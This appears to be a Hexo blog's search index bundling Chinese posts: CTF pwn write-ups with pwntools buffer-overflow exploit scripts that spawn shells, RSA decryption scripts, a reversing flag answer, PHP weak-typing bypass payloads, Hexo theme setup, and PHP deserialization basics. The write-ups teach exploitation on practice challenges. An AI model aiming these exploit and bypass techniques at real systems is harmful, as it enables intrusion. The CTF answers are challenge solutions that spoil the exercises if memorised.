<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[基本的栈溢出]]></title>
    <url>%2F2019%2F10%2F08%2F%E5%9F%BA%E6%9C%AC%E7%9A%84%E6%A0%88%E6%BA%A2%E5%87%BA%2F</url>
    <content type="text"><![CDATA[程序的内存结构 栈防护技术RELRO在Linux系统安全领域数据可以写的存储区就会是攻击的目标，尤其是存储函数指针的区域，尽量减少可写的存储区域可使安全系数提高。GCC, GNU linker以及Glibc-dynamic linker一起配合实现了一种叫做relro的技术Relocation Read Only, 重定向只读，实现就是由linker指定binary的一块经过dynamic linker处理过 relocation之后的区域为只读。（参考RELRO技术细节） Stack栈溢出检查，用Canary金丝雀值是否变化来检测,Canary found表示开启。 金丝雀最早指的是矿工曾利用金丝雀来确认是否有气体泄漏，如果金丝雀因为气体泄漏而中毒死亡，可以给矿工预警。这里是一种缓冲区溢出攻击缓解手段：启用栈保护后，函数开始执行的时候会先往栈里插入cookie信息，当函数真正返回的时候会验证cookie信息是否合法，如果不合法就停止程序运行。攻击者在覆盖返回地址的时候往往也会将cookie信息给覆盖掉，导致栈保护检查失败而阻止shellcode的执行。在Linux将cookie信息称为Canary。 NX No Execute，栈不可执行，也就是windows上的DEP。 PIEposition-independent executables, 位置无关的可执行文件，也就是常说的ASLR(Address space layout randomization) 地址随机化，程序每次启动基址都随机。 DEP分析缓冲区溢出攻击，其根源在于现代计算机对数据和代码没有明确区分这一先天缺陷，就目前来看重新去设计计算机体系结构基本上是不可能的，我们只能靠向前兼容的修补来减少溢出带来的损害，DEP就是用来弥补计算机对数据和代码混淆这一天然缺陷的。 DEP的基本原理是将数据所在内存页标识为不可执行，当程序溢出成功转入shellcode时，程序会尝试在数据页面上执行指令，此时CPU就会抛出异常，而不是去执行恶意指令。DEP的主要作用是阻止数据页（如默认的堆页、各种堆栈页以及内存池页）执行代码。硬件DEP需要CPU的支持，AMD和Intel都为此做了设计，AMD称之为No-Execute Page-Protection（NX），Intel称之为Execute Disable Bit（XD） 0x01 where did you born先checksec下，看下防护措施： 没有开启PIE。直接放到IDA里看下： 图中箭头处即是溢出点。分析下 第一次输入overflowme，如果等于1926就会退出，但是想要拿到flag，就需要overflowme的值为1926，那就很明显了，第一次输入的时候随便输个数只要不是1926就行，第二次输入v4 这个数组的时候，利用缓冲区溢出，将overflowme这个变量的值给覆盖成1926就行了，将1926转化为16进制为0x786。通过IDA看下数组和overflow这个变量之间的距离： 0x20-0x18，得到距离是8个字节。只要填充8个字节的垃圾数据，再将其后4个字节的空间覆盖为0x00000786就可以了。此时栈空间如下图： 脚本： 123456789from pwn import*a=remote('111.198.29.45',"50711")a=process('./when_did_you_born')a.recvuntil("What's Your Birth?")a.send('1998')a.recvuntil("What's Your Name?")payload='a'*8+p32(0x00000786)a.senline(payload)a.interactive() 0x02 hello_pwn用IDA查看源码： 可以看到unk_601068跟dword_60106c是连在一起的，所以只需要在read处溢出unk_601068覆盖dword_60106c为0x6E756161即可.exp: 123456from pwn import *p = process('./hello_pwn')p = remote("111.198.29.45","31004")payload = 4*'a' + p32(0x6E756161)p.sendline(payload)p.interactive() 0x03 level0首先用checksec查一下保护。几乎没开什么保护措施。 用ida反汇编。main函数就调用了两个函数。跟进第二个函数 找到溢出点，通过buf缓冲区。又找到函数callsystem()。只要控制程序返回到callsystem地址即可。找到callsystem地址。 脚本： 123456from pwn import*a=remote("111.198.29.45","53539")#a.recvuntil("Hello, World")payload=0x88*'a'+p64(0x400596)a.sendline(payload)a.interactive() 因为是64位程序，所以覆盖rbp和返回地址时都要用64位数据 0x04 level4 放到ida中发现了“/bin/sh”串，和system函数，可以利用== 所以只要在vuln函数返回时跳转到system函数，同时添加参数“/bin/sh”就可以实现exp: 1234567891011121314151617from pwn import *io = remote("pwn2.jarvisoj.com",9878)elf = ELF("./level2")sys_addr = elf.symbols["system"]bin_addr = elf.search("/bin/sh").next()payload = 'a'*(0x88 + 0x4) #辣鸡填充值payload += p32(sys_addr) #覆盖返回地址到system函数payload += p32(0xdeadbeef) #随意填写system函数调用结束的返回地址payload += p32(bin_addr) #system函数的参数，指向“/bin/sh”，实现调用io.recvline()io.sendline(payload)io.interactive()io.close() 12345678910111213141516171819 p = remote("111.198.29.45","50821")elf = ELF("./level2")sys_addr = elf.symbols["system"] bin_addr = elf.search("/bin/sh").next()payload = 'a'*0x8c payload += p32(sys_addr) payload += p32(0x12345678) payload += p32(bin_addr)'''system=0x08048320binsh=0x0804A024payload='a'*0x8cpayload+=p32(system)payload+=p32(0x12345678)payload+=p32(binsh)p.recvline() p.sendline(payload) p.interactive() 此时程序流程如图 相当于进行了两次溢出。第一次vulnable函数返回地址溢出为system函数地址，第二次system函数返回地址溢出为bin/sh地址 0x05 warmup-csaw 这个程序没有开启任何的保护，而且文件是动态链接却没有给出libc 丢进IDA看一下： 看到了熟悉的gets()函数，通常一看到这个函数就八成有缓冲区溢出漏洞，可以看出程序为v5开辟了40H的存储空间，所以输入长度超过40H即可造成溢出，再看sprint()函数 进入sub_40060D中看一下： 可以看到这个函数是获取flag的关键点，程序会打印出此函数的位置，即0x40060d，到这里思路就差不多明了了，我们需要控制溢出位置，把返回地址改为此函数的地址 exp: 123456from pwn import *a=remote(" "," ")a.recvuntil("&gt;")payload= 'a'*0x40+'a'*8+p64(0x000000000040060D)a.sendline(payload)a.interactive() 0x06 guss num 开启了栈溢出保护和地址随机化，是64位程序 猜随机数的一题，种子是seed[0]，循环10次，10次均对即可跳到sub_C3E函数执行system(“cat flag”)，checksec一波发现开启了canary,不能直接栈溢出到sub_C3E函数 发现var_30在栈中占0x20，可以覆盖到seed如果使输入的guessnumber，即v4等于随机数v6，即可cat flag。只要把seed覆盖为我们已知道的数字，那么生成的随机数也可以算出了。随机函数生成的随机数并不是真的随机数，他们只是在一定范围内随机，实际上是一段数字的循环，这些数字取决于随机种子。在调用rand()函数时，必须先利用srand()设好随机数种子，如果未设随机数种子，rand()在调用时会自动设随机数种子为1。对于该题目，我们将随机种子设置为0或1都可 关于ctype库与dll我们使用python标准库中自带的ctypes模块进行python和c的混合编程 libc共享库可以使用ldd查找 kk@ubuntu:~/Desktop/black/GFSJ/guess_num$ ldd guess_num linux-vdso.so.1 =&gt; (0x00007ffd3f5a0000) libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007f1e6c0b0000) /lib64/ld-linux-x86-64.so.2 (0x00007f1e6c67d000)也可以在脚本中通过elf文件查找 elf = ELF(&apos;./guess_num&apos;) libc = elf.libc exp如下: 1234567891011121314151617181920from pwn import *from ctypes import *a = remote('111.198.29.45',46063)a = process('./guess_num')elf = ELF('./guess_num')libc = elf.libclibc = cdll.LoadLibrary("/lib/x86_64-linux-gnu/libc.so.6")payload = "a" * 0x20 + p64(1)a.recvuntil('Please let me know your name!')a.sendline(payload)libc.srand(1)for i in range(10): num = str(libc.rand()%6+1) a.recvuntil('number:') a.sendline(num)a.interactive() 123456789101112131415from pwn import *from ctypes import*context.log_level = 'debug' p = process("./guess_num") libc = cdll.LoadLibrary("/lib/x86_64-linux-gnu/libc.so.6")pay = "A"*0x20 + p64(1)p.sendlineafter("name:",pay)libc.srand(1)for i in range(10): p.sendlineafter("number:",str(libc.rand()%6 + 1))print p.recv() 0x07 dice game和上题类似。rand()生成的随机数和随机种子seed()有关，通过观察题目，可以发现存在溢出漏洞，通过输入可以覆盖到seed(),实现一个可预测的随机数列。 题目分析：这边就可以看到，buf覆盖0x40位就能覆盖到seed。buf 长度最长为 0x50 但是当输入大于 49 的时候不会被截断，所以我们只要覆盖到之前的 seed 就可以为所欲为了。同时注意到 seed 跟 buf 相差的偏移是 0x40，所以只要 68 个字符就可以溢出覆盖 seed 了。 sub_A20()如下，就是比较你输入的数是否和产生的随机数相等。 当回答正确50次时，会执行sub_B28这个函数，读取flag。 所以我们要做的就是，将seed覆盖掉，并且去预测生成的随机数。 1234567891011121314151617from pwn import *from ctypes import * context.log_level='debug'libc = cdll.LoadLibrary("libc.so.6")p = process('./dice_game') p = remote("111.198.29.45",58630)p.recvuntil(" let me know your name: ")p.send("A" * 0x40 + p64(1))libc.srand(1)for i in range(50): p.recvuntil("Give me the point(1~6): ") p.send(str(libc.rand()%6 + 1) + "\n") p.interactive() for i in range(50): a.append(libc.rand()%6+1) print(a) for i in a: p.recv() print(p.recv()) p.sendline(str(i)) p.interactive()0x08 cgpwn2拿到题目检查防护： 简单运行下： 放到ida里看下： 函数上面一大串代码都没啥用。主要是这里： 这个name是全局变量。 程序本身调用了system函数，但是没有现成的/bin/sh字符串，可以使用fgets将/bin/sh字符串读入bss区，然后将返回地址覆盖为system函数，参数布置为name的首地址。 bss段具有读写权限，我们可以将”/bin/sh”传到bss段，然后，调用system()函数，从bss段传入字符串我们通过传入name的值位”/bin/sh”,达到将值写入bss段的目的 s的栈空间是0x38,32位的内存是4位，所以，s加上ebp的空间大小是0x4242个 字符 就可以 返回我们gets 的返回地址 然后 我们 只需要 讲system 搞进去 然后输入 bin/sh 就可以了 但是别忘了 输入 system 的返回地址 （这个随便输入就行） 需要输入三个函数的返回地址，第一个是fgets，返回地址是bss_addr,目的是往bss段写入bin/sh,x00是为了补齐八位第二个返回地址是gets,返回地址是system_addr，目的是调用system函数第三个返回地址是system,返回地址随意 1234567891011from pwn import *p = process('./cgpwn2')p = remote("111.198.29.45","44496")system_addr = 0x8048420bss_addr = 0x804A080p.recvuntil('name\n')p.sendline("/bin/sh\x00")p.recvuntil('here:\n')payload = 42*'a' + p32(system_addr) + p32(0) + p32(bss_addr)p.sendline(payload)p.interactive()]]></content>
      <categories>
        <category>PWN</category>
      </categories>
      <tags>
        <tag>CTF PWN</tag>
        <tag>二进制漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[RSA加密算法]]></title>
    <url>%2F2019%2F10%2F08%2FRSA%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95%2F</url>
    <content type="text"><![CDATA[0x01 RSA介绍RSA加密算法是一种非对称加密算法。在公开密钥加密和电子商业中RSA被广泛使用。对极大整数做因数分解的难度决定了RSA算法的可靠性。换言之，对一极大整数做因数分解愈困难，RSA算法愈可靠。假如有人找到一种快速因数分解的算法的话，那么用RSA加密的信息的可靠性就肯定会极度下降。但找到这样的算法的可能性是非常小的。今天只有短的RSA钥匙才可能被强力方式解破。到目前为止，世界上还没有任何可靠的攻击RSA算法的方式。只要其钥匙的长度足够长，用RSA加密的信息实际上是不能被解破的。 0x02 RSA算法RSA的安全基于大数分解的难度。其公钥和私钥是一对大素数（100到200位十进制数或更大）的函数。从一个公钥和密文恢复出明文的难度，等价于分解两个大素数之积（这是公认的数学难题）。 RSA的公钥、私钥的组成，以及加密、解密的公式可见于下表： 算法描述：（1）选择一对不同的、足够大的素数p，q。 （2）计算n=pq。 （3）计算f(n)=(p-1)(q-1)，同时对p, q严加保密，不让任何人知道。 （4）找一个与f(n)互质的数e，且1&lt;e&lt;f(n)。 （5）计算d，使得de≡1 mod f(n)。这个公式也可以表达为d ≡e-1 mod f(n) （6）公钥KU=(e,n)，私钥KR=(d,n)。 （7）加密时，先将明文变换成0至n-1的一个整数M。若明文较长，可先分割成适当的组，然后再进行交换。设密文为C，则加密过程为 （8）解密过程为 0x03 python计算私钥已知p,q,e,求d 1234567import gmpy2p=473398607161q=4511491e=17phi=(p-1)*(q-1)d=long(gmpy2.invert(e,phi))print d 0x04 python解密已知p,q,e,c,求m 123456789101112import gmpy2n=73069886771625642807435783661014062604264768481735145873508846925735521695159e=65537p = 386123125371923651191219869811293586459q = 189239861511125143212536989589123569301assert n==p*qc=15116717704501623028903918131505510580599561357387431295289012193980554012811d=gmpy2.invert(e,(p-1)*(q-1))m=pow(c,d,n)print (m)]]></content>
      <categories>
        <category>密码学</category>
      </categories>
      <tags>
        <tag>CTF密码学</tag>
        <tag>密码学</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[XCTF 逆向 re1-100]]></title>
    <url>%2F2019%2F10%2F08%2FXCTF-%E9%80%86%E5%90%91-re1-100%2F</url>
    <content type="text"><![CDATA[用ida（x64）打开，找到主函数main直接进行分析，找到以下代码： 这一堆的代码看上去就是检查一些东西的，比如说checkStringIsNumber()就是检查字符串是不是全部都是数字. 继续往下走 bufParentRead是我们输入的字符串，查看confuseKey函数： 这里的字符顺序有问题，将我们输入的分成4段然后重新组合，重新组合。我们就直接修改要比较的字符串就好了，变换一下顺序：53fc275d81053ed5be8cdaf29f59034938ae4efd]]></content>
      <categories>
        <category>CTF逆向</category>
      </categories>
      <tags>
        <tag>CTF 逆向</tag>
        <tag>逆向</tag>
        <tag>IDA</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PHP弱类型]]></title>
    <url>%2F2019%2F10%2F07%2FPHP%E5%BC%B1%E7%B1%BB%E5%9E%8B%2F</url>
    <content type="text"><![CDATA[0x01 什么是弱类型强类型语言，当你定义一个变量是某个类型，如果不经过代码显式转换（强制转化）过，它就永远都是这个类型，如果把它当做其他类型来用，就会报错 弱类型语言，你想把这个变量当做什么类型来用，就当做什么类型来用，语言的解析器会自动（隐式）转换。 0x02 弱类型整数大小比较1234$temp = $_GET['password'];is_numeric($temp)?die("no numeric"):NULL;if($temp&gt;1336)&#123;echo $flag; is_numeric() 函数用于检测变量是否为数字或数字字符串。如果指定的变量是数字和数字字符串则返回 TRUE，否则返回 FALSE(PHP 版本要求：PHP 4, PHP 5, PHP 7) 在这里先判断是不是数字。然后再判断这个数字是不是大于1336。 可以用数组绕过、%00截断、添加其他字符PHP数组有一个缺陷就是大多数的函数都没有办法去判断数组。 http://123.206.87.240:9009/22.php?password[]=1 http://123.206.87.240:9009/22.php?password=9999a http://123.206.87.240:9009/22.php?password=9999%00 0x03 “==”和“===”php中有两种比较的符号 == 与 === 1234 &lt;?php$a = $b ;$a===$b ;?&gt; === 在进行比较的时候，会先判断两种字符串的类型是否相等，再比较 == 在进行比较的时候，会先将字符串类型转化成相同，再比较。如果比较一个数字和字符串或者比较涉及到数字内容的字符串，则字符串会被转换成数值并且比较按照数值来进行 例子： 1234567891011在$a==$b;中$a=' ';$b=null //true$a=null;$b=true //true $a=0;$b='0' //true$a=0;$b='abcdef ' //true ($a===$b //false)var_dump("admin"==0); //truevar_dump("1admin"==1); //truevar_dump("admin1"==1) //falsevar_dump("admin1"==0) //truevar_dump("0e123456"=="0e4456789"); //true “admin”==0 比较的时候，会将admin转化成数值，强制转化,由于admin是字符串，转化的结果是0,和0相等 “1admin”==1 比较的时候会将1admin转化成数值,结果为1“admin1“被转化为0。当一个字符串欸当作一个数值来取值，其结果和类型如下:如果该字符串没有包含’.’,’e’,’E’并且其数值值在整形的范围之内该字符串被当作int来取值，其他所有情况下都被作为float来取值，该字符串的开始部分决定了它的值，如果该字符串以合法的数值开始，则使用该数值，否则其值为0。 “0e123456”==”0e456789”相互比较的时候，会将0e这类字符串识别为科学技术法的数字，0的无论多少次方都是零，所以相等 0x04 md5绕过（Hash比较缺陷）12345678910111213141516&lt;?phpif (isset($_GET['Username']) &amp;&amp; isset($_GET['password'])) &#123; $logined = true; $Username = $_GET['Username']; $password = $_GET['password']; if (!ctype_alpha($Username)) &#123;$logined = false;&#125; if (!is_numeric($password) ) &#123;$logined = false;&#125; if (md5($Username) != md5($password)) &#123;$logined = false;&#125; if ($logined)&#123; echo "successful"; &#125;else&#123; echo "login failed!"; &#125; &#125;?&gt; 意思：输入Username（字符串型）和password（数字型），并且两者md5相等，即可成功。 做法：0e在比较的时候会将其视作为科学计数法，所以无论0e后面是什么，0的多少次方还是0。md5(‘240610708’) == md5(‘QNKCDZO’)成功绕过下列是md5开头是0e的字符串： 1234567891011121314151617181920212223242526QNKCDZO0e830400451993494058024219903391s878926199a0e545993274517709034328855841020 s155964671a0e342768416822451524974117254469 s214587387a0e848240448830537924465865611904 s214587387a0e848240448830537924465865611904 s878926199a0e545993274517709034328855841020 s1091221200a0e940624217856561557816327384675 s1885207154a0e5093672134182067008420087635142406107080e462097431906509019562988736854 0x05 json绕过123456789101112131415&lt;?phpif (isset($_POST['message'])) &#123; $message = json_decode($_POST['message']); $key ="*********"; if ($message-&gt;key == $key) &#123; echo "flag"; &#125; else &#123; echo "fail"; &#125; &#125; else&#123; echo "~~~~"; &#125;?&gt; 输入一个json类型的字符串，json_decode函数解密成一个数组，判断数组中key的值是否等于 $key的值，但是$key的值我们不知道，但是可以利用0==”admin”这种形式绕过 最终payload： message={“key”:0} 0x06 strcmp漏洞绕过strcmp是比较两个字符串，如果两者相等 返回0str1小于str2,返回负数 1234567891011&lt;?php $password="***************" if(isset($_POST['password']))&#123; if (strcmp($_POST['password'], $password) == 0) &#123; echo "Right!!!login success";n exit(); &#125; else &#123; echo "Wrong password.."; &#125;?&gt; 要求我们post一个password值，要与给定的password变量的值相等。 password[]=xxx可以绕过 。因为函数接受到了不符合的类型，将发生错误，但是还是判断其相等。 0x07 “array_search”与is_array”绕过is_array:判断传入的是不是一个数组，array_search（x，$数组）:在数组中寻找与指定值(x)相等的值. 实例在数组中搜索键值 “red”，并返回它的键名： 1234&lt;?php$a=array("a"=&gt;"red","b"=&gt;"green","c"=&gt;"blue");echo array_search("red",$a);?&gt; array_search() 函数在数组中搜索某个键值，并返回对应的键名。详细说明 array_search() 函数与 in_array() 一样，在数组中查找一个键值。如果找到了该值，匹配元素的键名会被返回。如果没找到，则返回 false。 如果第三个参数 strict 被指定为 true，则只有在数据类型和值都一致时才返回相应元素的键名 1234567891011121314151617&lt;?phpif(!is_array($_GET['test']))&#123;exit();&#125;$test=$_GET['test'];for($i=0;$i&lt;count($test);$i++)&#123; if($test[$i]==="admin")&#123; echo "error"; exit(); &#125; $test[$i]=intval($test[$i]);&#125;if(array_search("admin",$test)===0)&#123; echo "flag";&#125;else&#123; echo "false";&#125;?&gt; array_search函数 类似于== 也就是$a==”admin” 当然是$a=0 当然如果第三个参数为true则就不能绕过 先判断传入的是不是数组，然后循环遍历数组中的每个值，并且数组中的每个值不能和admin相等，并且将每个值转化为int类型，再判断传入的数组是否有admin，有则返回flag payload: test[]=0可以绕过]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>CTF Web</tag>
        <tag>弱类型</tag>
        <tag>PHP</tag>
        <tag>后端</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Hexo Next主题配置]]></title>
    <url>%2F2019%2F10%2F06%2FHexo-Next%E4%B8%BB%E9%A2%98%E9%85%8D%E7%BD%AE%2F</url>
    <content type="text"><![CDATA[添加评论功能可用的评论系统大概有： HyperComments：https://www.hypercomments.com （来自俄罗斯的评论系统，使用谷歌账号注册。） 来必力：https://livere.com （来自韩国，使用邮箱注册。） 畅言： http://changyan.kuaizhan.com （安装需要备案号。） Gitment： https://github.com/imsun/gitment （有点小bug，比如说每次需要手动初始化，登录时会跳到主页。。） Valine: https://github.com/xCss/Valine 来必力使用方法打开来必力官网：https://livere.com，注册，点击上方的安装，选择免费的city版本。并点击现在安装。 123456789101112131415161718&lt;!-- 来必力City版安装代码 --&gt;&lt;div id="lv-container" data-id="city" data-uid="*************"&gt; &lt;script type="text/javascript"&gt; (function(d, s) &#123; var j, e = d.getElementsByTagName(s)[0]; if (typeof LivereTower === 'function') &#123; return; &#125; j = d.createElement(s); j.src = 'https://cdn-city.livere.com/js/embed.dist.js'; j.async = true; e.parentNode.insertBefore(j, e); &#125;)(document, 'script'); &lt;/script&gt;&lt;noscript&gt; 为正常使用来必力评论功能请激活JavaScript&lt;/noscript&gt;&lt;/div&gt;&lt;!-- City版安装代码已完成 --&gt; 复制其中的uid字段。打开主题目录下的 blog/themes/next/_config.yml 配置文件，定位到 livere_uid 字段，粘贴上刚刚复制的UID。 Next主题背景设置添加背景在 NEXT 预留的自定义样式文件themes/next/source/css/-custom/custom.style中修改 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869// 添加背景图片body &#123; background:url(/images/background.jpg); background-repeat: no-repeat; background-attachment:fixed; background-position:50% 50%; background-size: cover; -webkit-background-size: cover; -o-background-size: cover; -moz-background-size: cover; -ms-background-size: cover; /*这是设置底部文字, 看个人需要修改*/ #footer &gt; div &gt; div &#123; color:#eee; &#125; /* .main-inner &#123; margin-top: 60px; padding: 60px 60px 60px 60px; background: #fff; opacity: 0.5; min-height: 500px;&#125;*//*.bg_content &#123;position: fixed;top: 0;z-index: -1;width: 100%;height: 100%;&#125;*///代码块复制按钮.highlight&#123; //方便copy代码按钮（btn-copy）的定位 position: relative;&#125;.btn-copy &#123; display: inline-block; cursor: pointer; background-color: #eee; background-image: linear-gradient(#fcfcfc,#eee); border: 1px solid #d5d5d5; border-radius: 3px; -webkit-user-select: none; -moz-user-select: none; -ms-user-select: none; user-select: none; -webkit-appearance: none; font-size: 13px; font-weight: 700; line-height: 20px; color: #333; -webkit-transition: opacity .3s ease-in-out; -o-transition: opacity .3s ease-in-out; transition: opacity .3s ease-in-out; padding: 2px 6px; position: absolute; right: 5px; top: 5px; opacity: 0;&#125;.btn-copy span &#123; margin-left: 5px;&#125;.highlight:hover .btn-copy&#123; opacity: 1;&#125;&#125;// Custom styles. 透明背景内容部分在themes\next\source\css_schemes\Pisces_layout.styl 文件 .content-wrap 标签下 background: white修改为： 1background: rgba(255,255,255,0.3); //0.3是透明度 菜单栏在themes\next\source\css_schemes\Pisces_layout.styl 文件 .header-inner 标签下 background: white修改为： 1background: rgba(255,255,255,0.3); //0.3是透明度 站点概况在 themes\next\source\css_schemes\Pisces_sidebar.styl 文件 .sidebar-inner 标签下 background: white修改为： 1234567891011121314151617background: rgba(255,255,255,0.3); //0.3是透明度``` 然后修改博客根目录 themes\next\source\css\_schemes\Pisces\_layout.styl 文件 .sidebar 标签下 background: $body-bg-color修改为：``` bashbackground: rgba(255,255,255,0.3); //0.3是透明度``` #### 按钮背景themes\next\source\css\_common\components\post\post-button.styl 同上修改对应位置为 background: transparent;## next主题设置首页显示预览themes/next目录，用文本编辑器打开_config.yml文件 搜索"auto_excerpt",找到如下部分： ``` bash auto_excerpt: enable: false length: 150 把enable改为对应的false改为true Hexo添加标签和分类首先打开theme/next/_config.yml，找到如下配置，删除”categories”和“tags”前的注释符#。 123456789menu: home: / || home about: /about/ || user tags: /tags/ || tags categories: /categories/ || th archives: /archives/ || archive #schedule: /schedule/ || calendar #sitemap: /sitemap.xml || sitemap #commonweal: /404/ || heartbeat 进入博客根目录下，执行如下两条命令： 12$ hexo create page tags$ hexo create page categories 打开要分类的文章，在文件头添加“tags”标签或“categories”进行分类。 12345678title: hexo 添加标签和分类 date: 2019-10-01 09:01:56categories: - hexo- tagstags:- hexo- tags 完成后hexo g,hexo s。 统计访客数在\themes\next_config.yml中找到busuanzi_count:并进行更改： 123456789101112131415busuanzi_count: # count values only if the other configs are false enable: true # custom uv span for the whole site site_uv: true site_uv_header: &lt;i class="fa fa-user"&gt;&lt;/i&gt; 访问人数 site_uv_footer: # custom pv span for the whole site site_pv: true site_pv_header: &lt;i class="fa fa-eye"&gt;&lt;/i&gt; 总访问量 site_pv_footer: 次 # custom pv span for one page only page_pv: true page_pv_header: &lt;i class="fa fa-file-o"&gt;&lt;/i&gt; 浏览 page_pv_footer: 次 添加文章结束标识 在路径 /themes/next/layout/_macro 中新建 passage-end-tag.swig 文件,并添加以下内容： 12345&lt;div&gt; &#123;% if not is_index %&#125; &lt;div style="text-align:center;color: #ccc;font-size:14px;"&gt;------ 本文结束------&lt;/div&gt; &#123;% endif %&#125;&lt;/div&gt; 打开 themes/next/layout/_macro/post.swig 文件,添加： 12345&lt;div&gt; &#123;% if not is_index %&#125; &#123;% include 'passage-end-tag.swig' %&#125; &#123;% endif %&#125; &lt;/div&gt; 然后打开主题配置文件 _config.yml,在末尾添加： 12passage_end_tag:enabled: true 添加代码复制下载插件clipboard.js 。打开 themes/next/source/lib/ ,新建文件夹 clipboard。把下载 clipboard.js下的 src 文件夹下的文件拖动到 clipboard文件夹下。打开 themes/next/source/js/src/ ,新建文件 custom.js ,代码如下: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102//此函数用于创建复制按钮function createCopyBtns() &#123; var $codeArea = $("figure table"); //查看页面是否具有代码区域，没有代码块则不创建 复制按钮 if ($codeArea.length &gt; 0) &#123; //复制成功后将要干的事情 function changeToSuccess(item) &#123; $imgOK = $("#copyBtn").find("#imgSuccess"); if ($imgOK.css("display") == "none") &#123; $imgOK.css(&#123; opacity: 0, display: "block" &#125;); $imgOK.animate(&#123; opacity: 1 &#125;, 1000); setTimeout(function() &#123; $imgOK.animate(&#123; opacity: 0 &#125;, 2000); &#125;, 2000); setTimeout(function() &#123; $imgOK.css("display", "none"); &#125;, 4000); &#125;; &#125;; //创建 全局复制按钮，仅有一组。包含：复制按钮，复制成功响应按钮 //值得注意的是：1.按钮默认隐藏，2.位置使用绝对位置 position: absolute; (position: fixed 也可以，需要修改代码) $(".post-body").before('&lt;div id="copyBtn" style="opacity: 0; position: absolute;top:0px;display: none;line-height: 1; font-size:1.5em"&gt;&lt;span id="imgCopy" &gt;&lt;i class="fa fa-paste fa-fw"&gt;&lt;/i&gt;&lt;/span&gt;&lt;span id="imgSuccess" style="display: none;"&gt;&lt;i class="fa fa-check-circle fa-fw" aria-hidden="true"&gt;&lt;/i&gt;&lt;/span&gt;'); //创建 复制 插件，绑定单机时间到 指定元素，支持JQuery var clipboard = new Clipboard('#copyBtn', &#123; target: function() &#123; //返回需要复制的元素内容 return document.querySelector("[copyFlag]"); &#125;, isSupported: function() &#123; //支持复制内容 return document.querySelector("[copyFlag]"); &#125; &#125;); //复制成功事件绑定 clipboard.on('success', function(e) &#123; //清除内容被选择状态 e.clearSelection(); changeToSuccess(e); &#125;); //复制失败绑定事件 clipboard.on('error', function(e) &#123; console.error('Action:', e.action); console.error('Trigger:', e.trigger); &#125;); //鼠标 在复制按钮上滑动和离开后渐变显示/隐藏效果 $("#copyBtn").hover( function() &#123; $(this).stop(); $(this).css("opacity", 1); &#125;, function() &#123; $(this).animate(&#123; opacity: 0 &#125;, 2000); &#125; ); &#125;&#125;//感应鼠标是否在代码区$("figure").hover( function() &#123; //-------鼠标活动在代码块内 //移除之前含有复制标志代码块的 copyFlag $("[copyFlag]").removeAttr("copyFlag"); //在新的（当前鼠标所在代码区）代码块插入标志：copyFlag $(this).find(".code").attr("copyFlag", 1); //获取复制按钮 $copyBtn = $("#copyBtn"); if ($copyBtn.lenght != 0) &#123; //获取到按钮的前提下进行一下操作 //停止按钮动画效果 //设置为 显示状态 //修改 复制按钮 位置到 当前代码块开始部位 //设置代码块 左侧位置 $copyBtn.stop(); $copyBtn.css("opacity", 0.8); $copyBtn.css("display", "block"); $copyBtn.css("top", parseInt($copyBtn.css("top")) + $(this).offset().top - $copyBtn.offset().top + 3); $copyBtn.css("left", -$copyBtn.width() - 3); &#125; &#125;, function() &#123; //-------鼠标离开代码块 //设置复制按钮可见度 2秒内到 0 $("#copyBtn").animate(&#123; opacity: 0 &#125;, 2000); &#125;);//页面载入完成后，创建复制按钮$(document).ready(function() &#123; createCopyBtns();&#125;); 打开 themes/next/layout/_custom/ ,新建文件 custom.swig ，代码如下: 12&lt;script type="text/javascript" src="/lib/clipboard/clipboard.js"&gt;&lt;/script&gt;&lt;script type="text/javascript" src="/js/src/custom.js"&gt;&lt;/script&gt; 修改文件 themes/next/layout/_layout.swig ,在标签 上面插入代码: 1&#123;% include '_custom/custom.swig' %&#125; 参考：https://zhuanlan.zhihu.com/p/30836436]]></content>
      <categories>
        <category>Hexo</category>
      </categories>
      <tags>
        <tag>Hexo</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PHP反序列化漏洞（1）]]></title>
    <url>%2F2019%2F10%2F06%2FPHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%881%EF%BC%89%2F</url>
    <content type="text"><![CDATA[背景Serialize() //将一个对象转换成一个字符串 unserialize() //将字符串还原成一个对象 通过序列化与反序列化我们可以很方便的在PHP中进行对象的传递。本质上反序列化是没有危害的。但是如果用户对数据可控那就可以利用反序列化构造payload攻击。 常见方法__construct()//创建对象时触发__destruct() //对象被销毁时触发__call() //在对象上下文中调用不可访问的方法时触发__callStatic() //在静态上下文中调用不可访问的方法时触发__get() //用于从不可访问的属性读取数据__set() //用于将数据写入不可访问的属性__isset() //在不可访问的属性上调用isset()或empty()触发__unset() //在不可访问的属性上使用unset()时触发__invoke() //当脚本尝试将对象调用为函数时触发 比较重要的方法__sleep()serialize() 函数会检查类中是否存在一个魔术方法 __sleep()。如果存在，该方法会先被调用，然后才执行序列化操作。此功能可以用于清理对象，并返回一个包含对象中所有应被序列化的变量名称的数组。如果该方法未返回任何内容，则 NULL 被序列化，并产生一个 E_NOTICE 级别的错误。对象被序列化之前触发，返回需要被序列化存储的成员属性，删除不必要的属性。 __wakeup()unserialize() 会检查是否存在一个 __wakeup() 方法。如果存在，则会先调用 __wakeup 方法，预先准备对象需要的资源。 wakeup()函数用法:wakeup()是用在反序列化操作中。unserialize()会检查存在一个wakeup()方法。如果存在，则先会调用wakeup()方法。 123456789&lt;?phpclass A&#123;function __wakeup()&#123;echo 'Hello';&#125;&#125;$c = new A();$d=unserialize('O:1:"A":0:&#123;&#125;');?&gt; 最后页面输出了Hello。在反序列化的时候存在__wakeup()函数，所以最后就会输出Hello。 __wakeup()函数漏洞说明: 1234567891011121314&lt;?phpclass Student&#123;public $full_name = 'zhangsan';public $score = 150;public $grades = array();function __wakeup() &#123;echo "__wakeup is invoked";&#125;&#125;$s = new Student();var_dump(serialize($s));?&gt; 